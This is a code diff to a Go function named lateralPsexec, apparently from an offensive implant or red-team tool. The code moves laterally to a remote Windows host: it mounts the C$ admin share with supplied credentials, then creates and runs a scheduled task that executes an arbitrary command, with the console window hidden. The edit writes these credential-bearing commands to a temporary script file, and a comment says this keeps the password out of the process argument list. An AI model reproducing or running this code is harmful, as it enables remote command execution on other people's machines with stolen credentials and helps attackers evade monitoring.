@@ -15,16 +15,17 @@ func lateralPsexec(target, user, pass, cmd string) (string, error) {
 		cmd = "whoami"
 	}
 	if user != "" {
-		nc := exec.Command("cmd", "/c", fmt.Sprintf(`net use \\%s\C$ /user:%s %s`, target, user, pass))
-		applyHideWindow(nc)
-		nc.CombinedOutput()
+		// Credential-bearing path (S3): keep the password out of the process
+		// argv by running net-use + schtasks from a temp script file.
+		schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
+		script := fmt.Sprintf(`net use \\%s\C$ /user:%s %s`+"\r\n", target, user, pass)
+		script += fmt.Sprintf(`schtasks /s %s /u %s /p %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`+"\r\n", target, user, pass, schName, cmd)
+		script += fmt.Sprintf(`schtasks /s %s /run /tn %s`, target, schName)
+		return runCmdScriptFile(script)
 	}
 
 	schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
-	schCmd := fmt.Sprintf(`schtasks /s %s /u %s /p %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, user, pass, schName, cmd)
-	if user == "" {
-		schCmd = fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, schName, cmd)
-	}
+	schCmd := fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, schName, cmd)
 	c := exec.Command("cmd", "/c", schCmd)
 	applyHideWindow(c)
 	out, err := c.CombinedOutput()
